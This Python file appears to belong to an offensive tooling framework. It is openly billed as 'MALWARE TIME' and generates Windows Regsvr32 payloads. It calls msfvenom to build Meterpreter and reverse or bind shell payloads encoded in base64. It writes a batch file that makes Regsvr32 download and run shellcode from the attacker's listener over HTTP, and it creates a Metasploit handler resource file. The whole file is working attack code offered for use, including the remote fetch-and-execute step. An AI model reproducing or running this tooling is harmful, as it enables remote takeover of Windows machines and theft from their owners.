#! /usr/bin/env python3
##RegSRV32 Payloads
import os
import importlib
from importlib import util

spec = importlib.util.find_spec('.subserv', package='lib')
m = spec.loader.load_module()
customfolder = m.loc + "/aMALgamation/current/R32Custom/"
if not os.path.exists(customfolder):
    os.makedirs(customfolder)

##  32 bit regsrv32 custom payload
def regsrv32():
    os.system("clear")
    print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\t***MALWARE TIME!!!!!***\n\n" + m.bcolors.ENDC)

    print(
        m.bcolors.GREEN + m.bcolors.BOLD + "\tAll payloads and RC files will be put in:" + customfolder + m.bcolors.ENDC)
    while (1):
        print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)
        print(m.bcolors.BOLD + m.bcolors.GREEN + """
        *******************************************************************
          _   _   _   _   _   _   _   _     _   _   _   _  
         / \ / \ / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ 
        ( R | e | g | S | R | V | 3 | 2 ) ( M | e | n | u )
         \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 
              """ + m.bcolors.ENDC)

        print(
            m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
        print("\t(1)\tGenerate Windows 32bit payload")
        print("\t(2)\tGenerate Windows 64bit payload")
        print("\t(99)\tGo back to the Custom Malware Menu")
        print(m.bcolors.BLUE + "\t*******************************************************************" + m.bcolors.ENDC)

        options = input("\nW4@+ Ma1w@r3 R U W@^t1ng Brobi-Wan: ")
        if options == "1":
           r3232()
        elif options == "2":
           r3264()
        elif options == "99":
           os.system("clear")
           break
        else:
           input("You must be a Pats Fan! Come on pick something... ")
##  regsrv32 32 bit Meterpreter DLL EVADE
def r3232():
  global customfolder
  payload = "null"
  a = "windows/shell/bind_tcp"
  b = "windows/shell/reverse_tcp"
  c = "windows/shell/reverse_tcp_dns"
  d = "windows/shell/reverse_udp"
  e = "windows/shell_bind_tcp"
  f = "windows/shell_reverse_tcp"
  a1 = "windows/meterpreter/bind_tcp"
  b1 = "windows/meterpreter/reverse_http"
  c1 = "windows/meterpreter/reverse_https"
  d1 = "windows/meterpreter/reverse_tcp"
  e1 = "windows/meterpreter/reverse_tcp_dns"
  a2 = "windows/meterpreter_bind_tcp"
  b2 = "windows/meterpreter_reverse_http"
  c2 = "windows/meterpreter_reverse_https"
  e2 = "windows/meterpreter_reverse_tcp"
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tPayload Options\n\n" + m.bcolors.ENDC)
  print(m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
  print("""
   Best Payloads to use
    (a) ---%s
    (b) ---%s
    (c) ---%s
    (d) ---%s
    (e) ---%s
    (f) ---%s
    (a1)---%s
    (b1)---%s
    (c1)---%s
    (d1)---%s
    (e1)---%s
    (a2)---%s
    (b2)---%s
    (c2)---%s
    (e2)---%s

  """ %(a, b, c, d, e, f, a1, b1, c1, d1, e1, a2, b2, c2, e2))

  if (payload == "null"):
    print(
        "Please pick a payload type that meets your needs. Use the letter/number to pick the payload.. Example 'a' for windows/shell/bind_tcp\n")
    payload = input("\tEnter payload type:  ") or e2
    if payload == 'a':
        payload = a
    elif payload == 'b':
        payload = b
    elif payload == 'c':
        payload = c
    elif payload == 'd':
        payload = d
    elif payload == 'e':
        payload = e
    elif payload == 'f':
        payload = f
    elif payload == 'a1':
        payload = a1
    elif payload == 'b1':
        payload = b1
    elif payload == 'c1':
        payload = c1
    elif payload == 'd1':
        payload = d1
    elif payload == 'e1':
        payload = e1
    elif payload == 'a2':
        payload = a2
    elif payload == 'b2':
        payload = b2
    elif payload == 'c2':
        payload = c2
    elif payload == 'e2':
        payload = e2
    else:
        print(m.bcolors.ERROR + m.bcolors.BOLD + m.bcolors.UNDERLINE +"\t********Invalid payload***********" + m.bcolors.ENDC)

  print("\tYour Payload is: %s" %(payload))
  port = input("\tWhat Port are you wanting to use?:")
  print("\n\tRegsrv32 payload leverages shellcommand within the windows function.\n\tYou will need to think about where you want to store the base64 file\n\tUploading the dll file onto the target will be required.\n\tI recommend that you do NOT put the base64 payload on the target\n\tBut call it from an SMB share or web share.\n\n")
  bfilename = input("\tWhat is the name of your base64 payload file?:")
  dfilename = input("\tWhat is the name of your dll payload file?:")
  batfile = input("\tWhat is the name of your batch payload file?:")
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 32bit RegSrv32  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating 32bit Base64 payload ------- Named: " + bfilename + ".b64")
  os.system("msfvenom -p " + payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + port + " --platform win -a x86 EXITFUNC=thread -f raw 2>/dev/null  | base64 >" + customfolder + bfilename + ".b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 32 bit Reg32 BAT file... Best Way to run it.")
  metreg32_bat_file = open(customfolder + batfile +".bat", "w")
  metreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/%s.b64 %s.dll
""" %(m.listener_ip, bfilename, dfilename))
  metreg32_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/WEV_x86.dll " + customfolder + dfilename +".dll")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
  msf_resource_file = open(customfolder + bfilename + ".rc", "w")
  msf_resource_file.write("""use multi/handler
  set payload %s
  set LHOST %s
  set LPORT %s
  set ExitOnSession false
  exploit -j
  """ % (payload, m.listener_ip, port))


##  regsrv32 64 bit Meterpreter DLL EVADE
def r3264():
  global customfolder
  payload = "null"
  a = "windows/x64/shell/bind_tcp"
  b = "windows/x64/shell/reverse_tcp"
  c = "windows/x64/shell_bind_tcp"
  d = "windows/x64/shell_reverse_tcp"
  a1 = "windows/x64/meterpreter/bind_tcp"
  b1 = "windows/x64/meterpreter/reverse_http"
  c1 = "windows/x64/meterpreter/reverse_https"
  d1 = "windows/x64/meterpreter/reverse_tcp"
  a2 = "windows/x64/meterpreter_bind_tcp"
  b2 = "windows/x64/meterpreter_reverse_http"
  c2 = "windows/x64/meterpreter_reverse_https"
  e2 = "windows/x64/meterpreter_reverse_tcp"
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tPayload Options\n\n" + m.bcolors.ENDC)
  print(m.bcolors.ERROR + "\t*******************************************************************" + m.bcolors.ENDC)
  print("""
   Best Payloads to use
    (a) ---%s
    (b) ---%s
    (c) ---%s
    (d) ---%s
    (a1)---%s
    (b1)---%s
    (c1)---%s
    (d1)---%s
    (a2)---%s
    (b2)---%s
    (c2)---%s
    (e2)---%s

  """ % (a, b, c, d, a1, b1, c1, d1, a2, b2, c2, e2))

  if (payload == "null"):
    print(
        "Please pick a payload type that meets your needs. Use the letter/number to pick the payload.. Example 'a' for windows/shell/bind_tcp\n")
    payload = input("\tEnter payload type:  ") or e2
    if payload == 'a':
        payload = a
    elif payload == 'b':
        payload = b
    elif payload == 'c':
        payload = c
    elif payload == 'd':
        payload = d
    elif payload == 'a1':
        payload = a1
    elif payload == 'b1':
        payload = b1
    elif payload == 'c1':
        payload = c1
    elif payload == 'd1':
        payload = d1
    elif payload == 'a2':
        payload = a2
    elif payload == 'b2':
        payload = b2
    elif payload == 'c2':
        payload = c2
    elif payload == 'e2':
        payload = e2
    else:
        print(m.bcolors.ERROR + m.bcolors.BOLD + m.bcolors.UNDERLINE +"\t********Invalid payload***********" + m.bcolors.ENDC)

  print("\tYour Payload is: %s" %(payload))
  port = input("\tWhat Port are you wanting to use?:")
  print("\n\tRegsrv32 payload leverages shellcommand within the windows function.\n\tYou will need to think about where you want to store the base64 file\n\tUploading the dll file onto the target will be required.\n\tI recommend that you do NOT put the base64 payload on the target\n\tBut call it from an SMB share or web share.\n\n")
  bfilename = input("\tWhat is the name of your base64 payload file?:")
  dfilename = input("\tWhat is the name of your dll payload file?:")
  batfile = input("\tWhat is the name of your batch payload file?:")
  print(m.bcolors.GREEN + m.bcolors.BOLD + m.bcolors.UNDERLINE + "\tWe are generating the 64bit RegSrv32  Payloads NOW!" + m.bcolors.ENDC)
  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating \ 64bit Base64 payload ------- Named: " + bfilename + ".b64")
  os.system("msfvenom -p " + payload + " CMD=calc.exe LHOST=" + m.listener_ip + " LPORT=" + port + "  --platform win -a x64 EXITFUNC=thread -f raw 2>/dev/null | base64 >" + customfolder + bfilename +".b64")


  print(m.bcolors.BLUE + "\t[*]" + m.bcolors.ENDC + " Generating 64 bit Reg32 BAT file... Best Way to run it.")
  metreg64_bat_file = open(customfolder + batfile +".bat", "w")
  metreg64_bat_file.write("""cmd /k c:\Windows\SysWoW64\Regsvr32.exe /s /i:shellcode,http://%s/%s.b64 %s.dll
""" %(m.listener_ip, bfilename, dfilename))
  metreg64_bat_file.close()

  print("\tMoving files!!")
  os.system("cp ./src/WEV_x64.dll " + customfolder + dfilename + ".dll")

  print(m.bcolors.BLUE + "[*]" + m.bcolors.ENDC + " Generating MSF Resource File...")
  msf_resource_file = open(customfolder + bfilename + ".rc", "w")
  msf_resource_file.write("""use multi/handler
  set payload %s
  set LHOST %s
  set LPORT %s
  set ExitOnSession false
  exploit -j
  """ % (payload, m.listener_ip, port))
